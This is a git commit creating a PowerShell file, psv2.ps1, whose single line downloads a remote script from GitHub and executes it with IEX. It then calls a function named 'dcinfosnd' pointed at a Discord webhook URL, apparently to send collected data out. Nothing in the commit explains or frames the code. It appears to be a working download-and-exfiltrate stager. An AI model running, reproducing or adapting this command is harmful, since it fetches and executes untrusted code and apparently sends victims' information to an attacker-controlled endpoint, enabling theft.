294c93b0f47bb95d7aa0a6270625a6cd9bf76191
shankar acharya <34772838+5hank4r@users.noreply.github.com>
2026-04-15 18:59:23 +0545

    Create psv2.ps1

---
+++ psv2.ps1
@@ -0,0 +1,3 @@
+IEX ((iwr 'https://raw.githubusercontent.com/5hank4r/pass/refs/heads/main/newpassch.ps1' -UseBasicParsing).Content); dcinfosnd -hq 'https://discord.com/api/webhooks/1493947381086158989/X4Yk1sbjoLRerR8IKbJtqAfdP1mYja08HZWm9VuZmD8REoUviBY_iHxe7M1D52Xocpa-'
+
+
